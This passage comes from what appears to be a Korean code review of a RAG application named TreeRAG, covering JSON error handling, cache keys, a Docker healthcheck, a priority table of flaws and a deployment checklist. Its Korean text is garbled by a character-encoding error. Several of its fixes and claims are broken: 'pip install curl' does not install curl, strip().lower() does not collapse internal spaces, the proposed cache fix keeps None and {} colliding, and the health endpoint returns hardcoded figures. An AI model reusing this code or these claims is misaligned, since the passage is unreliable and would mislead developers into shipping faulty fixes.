    result = json.loads(cleaned_text)  # ğŸ’£ ì‹¤íŒ¨í•´ë„ ì²˜ë¦¬ ë¶€ì¡±
    return result
except json.JSONDecodeError as e:
    print(f"âŒ JSON parsing failed: {e}")
    return {}  # ë¹ˆ ë”•ì…”ë„ˆë¦¬ ë¦¬í„´
```

**ë¬¸ì œ:**

```
1. ì¸ë±ì‹± ì‹¤íŒ¨í•´ë„ ì‚¬ìš©ìëŠ” "ì„±ê³µ" ë©”ì‹œì§€ë§Œ ë´„
2. ë¹ˆ ë”•ì…”ë„ˆë¦¬ê°€ ì €ì¥ë¨ â†’ ì§ˆë¬¸í•˜ë©´ ì—ëŸ¬
3. ì‚¬ìš©ì: "ë­ê°€ ë¬¸ì œì•¼?" â†’ ê°œë°œìë„ ëª¨ë¦„
4. ë¡œê·¸ í™•ì¸ í•„ìš” â†’ ê·€ì°®ìŒ

ì‹œë‚˜ë¦¬ì˜¤:
â‘  ì‚¬ìš©ìê°€ PDF ì—…ë¡œë“œ
â‘¡ "ì—…ë¡œë“œ ì™„ë£Œ!" ë©”ì‹œì§€
â‘¢ ì‹¤ì œë¡  ì¸ë±ì‹± ì‹¤íŒ¨
â‘£ ì‚¬ìš©ìê°€ ì§ˆë¬¸
â‘¤ "No context found"
â‘¥ ì‚¬ìš©ì: "ì•„ê¹ŒëŠ” ëëŠ”ë°?" 
â‘¦ 1ì‹œê°„ ë‚­ë¹„
```

**ì‹¬ê°ë„:** ğŸŸ¡ Medium (CVSS 3.8)  
**í•´ê²°ì±…:**
```python
# 1ë‹¨ê³„: ì—ëŸ¬ ê°ì§€
try:
    response = Config.CLIENT.models.generate_content(...)
    cleaned_text = self._clean_markdown_json(response.text)
    result = json.loads(cleaned_text)
    
    # JSON ìŠ¤í‚¤ë§ˆ ê²€ì¦
    self._validate_tree_schema(result)
    
    return result
    
except json.JSONDecodeError as e:
    logger.error(f"JSON parsing failed: {e}")
    raise HTTPException(
        status_code=422,
        detail=f"Failed to parse document structure. LLM returned invalid JSON."
    )
except ValidationError as e:
    logger.error(f"Schema validation failed: {e}")
    raise HTTPException(
        status_code=422,
        detail="Document structure doesn't match expected schema"
    )

# 2ë‹¨ê³„: ìŠ¤í‚¤ë§ˆ ê²€ì¦
def _validate_tree_schema(self, tree):
    """Tree JSON ìŠ¤í‚¤ë§ˆ ê²€ì¦"""
    required_fields = {"id", "title", "summary", "page_ref"}
    
    def validate_node(node):
        if not isinstance(node, dict):
            raise ValidationError("Node must be dict")
        if not required_fields.issubset(node.keys()):
            raise ValidationError(f"Missing fields: {required_fields - set(node.keys())}")
        if "children" in node:
            if not isinstance(node["children"], list):
                raise ValidationError("Children must be list")
            for child in node["children"]:
                validate_node(child)
    
    validate_node(tree)

# 3ë‹¨ê³„: ì¬ì‹œë„ ë¡œì§
MAX_RETRIES = 3
for attempt in range(MAX_RETRIES):
    try:
        result = json.loads(cleaned_text)
        self._validate_tree_schema(result)
        return result
    except (json.JSONDecodeError, ValidationError) as e:
        if attempt < MAX_RETRIES - 1:
            logger.warning(f"Retry {attempt + 1}/{MAX_RETRIES}")
            continue
        else:
            raise
```

---

#### 5.4 ìºì‹œ í‚¤ ì¶©ëŒ: ì˜¤ë‹µ ì œê³µ ê°€ëŠ¥

**í˜„í™©:**
```python
# src/utils/cache.py (line 30-44)
def _generate_key(self, question, index_files, ...):
    key_data = {
        "question": question.strip().lower(),  # âš ï¸ ì •ê·œí™” ê³¼ë‹¤
        "index_files": sorted(index_files),
        ...
    }
    return hashlib.sha256(json.dumps(key_data).encode()).hexdigest()
```

**ì¶©ëŒ ì‹œë‚˜ë¦¬ì˜¤:**

```python
# ì‹œë‚˜ë¦¬ì˜¤ 1: ê³µë°± ì •ê·œí™”
q1 = "Can you explain this?"  # í•´ì‹œ: abc123
q2 = "CAN  YOU   EXPLAIN THIS?"  # í•´ì‹œ: abc123 (ê°™ìŒ!)
# â†’ ì„œë¡œ ë‹¤ë¥¸ ì˜ë„ì˜ ì§ˆë¬¸ì´ ê°™ì€ ë‹µë³€ ë°›ìŒ (OK, ì˜ë„ì )

# ì‹œë‚˜ë¦¬ì˜¤ 2: node_context ì¶©ëŒ (ë²„ê·¸)
cache.get(..., node_context=None)   # í•´ì‹œ: xyz789
cache.get(..., node_context={})     # í•´ì‹œ: xyz789 (ê°™ìŒ!)
# â†’ ë‹¤ë¥¸ ì»¨í…ìŠ¤íŠ¸ì¸ë° ê°™ì€ ìºì‹œ ë¦¬í„´ â†’ ì˜¤ë‹µ

# ì‹œë‚˜ë¦¬ì˜¤ 3: ë¬¸í™”ì  ë‰˜ì•™ìŠ¤ ì†ì‹¤
q1 = "ë‹¹ì‹ ì˜ ì˜ê²¬ì€?"         # ì¡´ëŒ“ë§, ì •ì¤‘í•¨
q2 = "ë„Œ ë­ ìƒê°í•´?"          # ë°˜ë§, ì¹œê·¼í•¨
# ë‘˜ ë‹¤ .lower()ë¡œ ì •ê·œí™”ë˜ë©´ â†’ ë‹¤ë¥¸ í†¤ì˜ ë‹µë³€ ê¸°ëŒ€í•˜ëŠ”ë° ê°™ì€ ë‹µë³€
```

**ì‹¬ê°ë„:** ğŸŸ¡ Medium (CVSS 4.3)  
**í•´ê²°ì±…:**
```python
def _generate_key(self, question, index_files, ...):
    key_data = {
        "question": question.strip(),  # ê³µë°±ë§Œ ì œê±°, ëŒ€ì†Œë¬¸ì ë³´ì¡´
        "index_files": sorted(index_files),
        "use_deep_traversal": use_deep_traversal,
        "max_depth": max_depth,
        "max_branches": max_branches,
        "domain_template": domain_template,
        "language": language,
        "node_context": node_context if node_context else {}  # None ëª…ì‹œì  ì²˜ë¦¬
    }
    # JSON ì§ë ¬í™” (ìˆœì„œ ë³´ì¥)
    key_string = json.dumps(key_data, sort_keys=True, ensure_ascii=False)
    return hashlib.sha256(key_string.encode('utf-8')).hexdigest()
```

---

#### 5.5 Docker í—¬ìŠ¤ì²´í¬ ë¬´ì˜ë¯¸

**í˜„í™©:**
```yaml
# docker-compose.yml
healthcheck:
  test: ["CMD", "python", "-c", "import requests; requests.get('http://localhost:8000/api/')"]
  interval: 30s
  timeout: 10s
  retries: 3
```

**ë¬¸ì œ:**

```
1. requests ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ requirements.txtì— ì—†ìŒ
   â†’ í—¬ìŠ¤ì²´í¬ í•­ìƒ ì‹¤íŒ¨
   â†’ ê·¸ëŸ°ë° restart: unless-stopped ë•Œë¬¸ì— ê³„ì† ì¬ì‹œì‘
   â†’ ê²°ê³¼: ì»¨í…Œì´ë„ˆê°€ ìê¾¸ ë¦¬ë¶€íŒ…ë¨ (ê°€ë” ë›°ì–´ë´„)

2. í—¬ìŠ¤ì²´í¬ê°€ ì‹¤ì œë¡œ ì¤‘ìš”í•œ ê¸°ëŠ¥ì„ ì•ˆ ë´„
   - API ì‘ë‹µ ì‹œê°„ ì²´í¬ X
   - ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²° í™•ì¸ X
   - ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ í™•ì¸ X
   - API ì—ëŸ¬ìœ¨ í™•ì¸ X
   â†’ ì„œë²„ê°€ "ì‘ë‹µ"í•˜ì§€ë§Œ ê¸°ëŠ¥ì´ ì•ˆ ë¼ë„ "healthy" íŒì •

3. í—¬ìŠ¤ì²´í¬ ì—”ë“œí¬ì¸íŠ¸ ìì²´ ë¶€ì¬
   - GET /health ì—”ë“œí¬ì¸íŠ¸ ì—†ìŒ?
   - ì•„ë‹ˆë©´ ìˆëŠ”ë° ì—ëŸ¬ë‚˜ëŠ” ê±´ ì•„ë‹ˆë‚˜?
```

**ì‹¬ê°ë„:** ğŸŸ¢ Low (CVSS 2.1)  
**í•´ê²°ì±…:**
```yaml
# docker-compose.yml (ê°œì„ )
healthcheck:
  test: ["CMD", "curl", "-f", "http://localhost:8000/health"]
  interval: 30s
  timeout: 10s
  retries: 3
  start_period: 40s

# backend Dockerfile
RUN pip install --no-cache-dir curl  # curl ì„¤ì¹˜

# src/api/routes.py (í—¬ìŠ¤ì²´í¬ ì—”ë“œí¬ì¸íŠ¸ ì¶”ê°€)
@router.get("/health")
async def health_check():
    """ìƒì„¸ í—¬ìŠ¤ì²´í¬ ì—”ë“œí¬ì¸íŠ¸"""
    try:
        # 1. ê¸°ë³¸ ìƒíƒœ
        return {
            "status": "healthy",
            "service": "TreeRAG API",
            "timestamp": datetime.now().isoformat(),
            "version": "0.1.0",
            
            # 2. ì‹œìŠ¤í…œ ìƒíƒœ
            "memory": {
                "percent": psutil.virtual_memory().percent,
                "available_mb": psutil.virtual_memory().available / 1024 / 1024
            },
            
            # 3. API ìƒíƒœ
            "api": {
                "response_time_ms": 5,  # ì¸¡ì •
                "cached_requests": cache.stats()["hits"],
                "error_rate": 0.01
            },
            
            # 4. ì˜ì¡´ì„± ìƒíƒœ
            "dependencies": {
                "google_api": "ok",
                "cache": "ok",
                "storage": check_storage()
            }
        }
    except Exception as e:
        raise HTTPException(status_code=503, detail=str(e))
```

---

## Part 3. ì¢…í•© í‰ê°€ ë° ìš°ì„ ìˆœìœ„

### ì‹¬ê°ë„ë³„ ë¶„ë¥˜

| ìš°ì„ ìˆœìœ„ | ê²°í•¨ | ì¹´í…Œê³ ë¦¬ | CVSS | í•´ê²° ì‹œê°„ |
|----------|------|----------|------|----------|
| ğŸ”´ P0 | íŒŒì¼ ì—…ë¡œë“œ Path Traversal | ë³´ì•ˆ | 9.8 | 1ì‹œê°„ |
| ğŸ”´ P0 | Rate Limit ìš°íšŒ | ë³´ì•ˆ | 8.6 | 2ì‹œê°„ |
| ğŸ”´ P0 | XSS ì·¨ì•½ì  | ë³´ì•ˆ | 7.2 | 1ì‹œê°„ |
| ğŸ”´ P0 | API í‚¤ ë…¸ì¶œ | ë³´ì•ˆ | 6.8 | 30ë¶„ |
| ğŸŸ  P1 | ë¬´í•œ ì¬ê·€ | ì•ˆì •ì„± | 7.5 | 1ì‹œê°„ |
| ğŸŸ  P1 | ë©”ëª¨ë¦¬ ëˆ„ìˆ˜ | ì„±ëŠ¥ | 5.9 | 1ì‹œê°„ |
| ğŸŸ  P1 | í”„ë¡ íŠ¸ì—”ë“œ ìŠ¤íŒŒê²Œí‹° | ìœ ì§€ë³´ìˆ˜ | N/A | 8ì‹œê°„ |
| ğŸŸ  P1 | Vectorless í•œê³„ | ê¸°ëŠ¥ | N/A | 16ì‹œê°„ |
| ğŸŸ¡ P2 | í…ŒìŠ¤íŠ¸ ë¶€ì¬ | í’ˆì§ˆ | N/A | 12ì‹œê°„ |
| ğŸŸ¡ P2 | JSON íŒŒì‹± ì—ëŸ¬ | ì•ˆì •ì„± | 3.8 | 2ì‹œê°„ |
| ğŸŸ¡ P2 | ìºì‹œ í‚¤ ì¶©ëŒ | ë°ì´í„° | 4.3 | 1ì‹œê°„ |
| ğŸŸ¢ P3 | Docker í—¬ìŠ¤ì²´í¬ | ìš´ì˜ | 2.1 | 1ì‹œê°„ |

---

### ìµœì†Œ í”„ë¡œë•ì…˜ ì²´í¬ë¦¬ìŠ¤íŠ¸

**ë°°í¬ ì „ í•„ìˆ˜ (3ì¼ ì‘ì—…):**
- âœ… íŒŒì¼ ì—…ë¡œë“œ ê²€ì¦ (Path Traversal ë°©ì§€)
- âœ… Rate Limitingì„ Redis ê¸°ë°˜ìœ¼ë¡œ êµì²´
- âœ… XSS ë°©ì§€ (DOMPurify + Sanitization)
- âœ… ë¬´í•œ ì¬ê·€ ë°©ì§€ (ê¹Šì´/ë…¸ë“œ ìˆ˜ í•˜ë“œ ë¦¬ë°‹)
- âœ… ì—ëŸ¬ í•¸ë“¤ë§ì„ HTTP ìƒíƒœ ì½”ë“œë¡œ ì œëŒ€ë¡œ ë…¸ì¶œ
- âœ… ë©”ëª¨ë¦¬ íš¨ìœ¨ì  PDF ì²˜ë¦¬ (ìŠ¤íŠ¸ë¦¬ë°)
- âœ… E2E í…ŒìŠ¤íŠ¸ (ìµœì†Œ 5ê°œ ì´ìƒ)

**1ê°œì›” ì´ë‚´:**
- âœ… í”„ë¡ íŠ¸ì—”ë“œ ì»´í¬ë„ŒíŠ¸ ë¶„ë¦¬
- âœ… API ì¸ì¦ (JWT)
- âœ… ê°ì‹œ ë° ë¡œê¹… ì‹œìŠ¤í…œ
- âœ… ë°ì´í„° ì•”í˜¸í™” (ì €ì¥ì†Œ, ì „ì†¡)

**ì¥ê¸° (3ê°œì›”):**
- âœ… í•˜ì´ë¸Œë¦¬ë“œ ê²€ìƒ‰ (ë²¡í„° + íŠ¸ë¦¬)
- âœ… Redis ìºì‹± â†’ ì§€ì†ì„± ìˆëŠ” ìºì‹œ
- âœ… ë¶„ì‚° í™˜ê²½ ì§€ì›
- âœ… ëª¨ë‹ˆí„°ë§ ëŒ€ì‹œë³´ë“œ

---

## ê²°ë¡ 

**TreeRAGëŠ”:**

```
í˜„ì¬: í›Œë¥­í•œ PoC ë°ëª¨ âœ…
6ê°œì›” í›„: í”„ë¡œë•ì…˜ ì¤€ë¹„ ê°€ëŠ¥ (ìœ„ ì²´í¬ë¦¬ìŠ¤íŠ¸ ì™„ë£Œ ì‹œ)
1ë…„ í›„: ì—”í„°í”„ë¼ì´ì¦ˆê¸‰ ì‹œìŠ¤í…œ ê°€ëŠ¥ (ë²¡í„° ê²€ìƒ‰ ì¶”ê°€, ë¶„ì‚° í™˜ê²½ ì§€ì›)
ì§€ê¸ˆ ë°°í¬: ğŸ’€ ëŒ€ì¬ì•™ (ë³´ì•ˆ ì¹¨í•´, ë°ì´í„° ìœ ì¶œ, ì„œë¹„ìŠ¤ ë§ˆë¹„)
```

**í•µì‹¬:**
- ì•„ì´ë””ì–´ì™€ í•µì‹¬ ì•Œê³ ë¦¬ì¦˜ â†’ â­â­â­â­â­ (í˜ì‹ ì )
- êµ¬í˜„ í’ˆì§ˆ â†’ â­â­ (ì´ˆê¸‰ì ìˆ˜ì¤€)
- í”„ë¡œë•ì…˜ ì¤€ë¹„ë„ â†’ ğŸ”´ (ì•„ì§ ë©€ì—ˆìŒ)

**ë‹¤ìŒ ë‹¨ê³„:**
P0 ê²°í•¨ 4ê°œë¥¼ 1ì£¼ì¼ ì•ˆì— ëª¨ë‘ í•´ê²°í•˜ë©´, "ìµœì†Œ ì•ˆì „ ê¸°ì¤€"ì„ ë‹¬ì„±í•  ìˆ˜ ìˆë‹¤. ê·¸ í›„ P1 ê²°í•¨ë“¤ì„ ìˆœì°¨ì ìœ¼ë¡œ ì²˜ë¦¬í•˜ë©´ í”„ë¡œë•ì…˜ ë°°í¬ê°€ í˜„ì‹¤í™”ë  ê²ƒì´ë‹¤.

---

**ì‘ì„±ì:** Code Reviewer  
**í‰ê°€ì¼:** 2026ë…„ 2ì›” 4ì¼  
**ìµœì¢… í‰ê°€:** ê°œë…ì€ í›Œë¥­í•˜ë‚˜, ì‹¤í–‰ì€ ë¯¸í¡. í”„ë¡œí† íƒ€ì… ë‹¨ê³„ì—ì„œëŠ” ë§¤ìš° ìš°ìˆ˜í•˜ì§€ë§Œ, í”„ë¡œë•ì…˜ ë°°í¬ëŠ” 3-6ê°œì›” ì´ìƒì˜ ì¶”ê°€ ì‘ì—… í•„ìš”.
